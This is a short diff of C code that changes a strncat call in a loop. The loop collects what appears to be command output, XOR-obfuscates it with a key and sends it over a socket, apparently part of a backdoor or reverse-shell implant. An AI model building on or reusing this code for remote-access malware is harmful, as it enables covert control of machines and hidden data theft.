@@ -72,7 +72,7 @@ int main(void)
 					char path[2050];
 					char command[12000];
 					while (fgets(path, sizeof(path), fp) != NULL) {
-					    strncat(command, path, strlen(path)+1);
+					    strncat(command, path, strlen(path));
 					}
 					char* xordata = XOR(command, key, strlen(command), keylen);
 					write(sock, xordata, strlen(command));
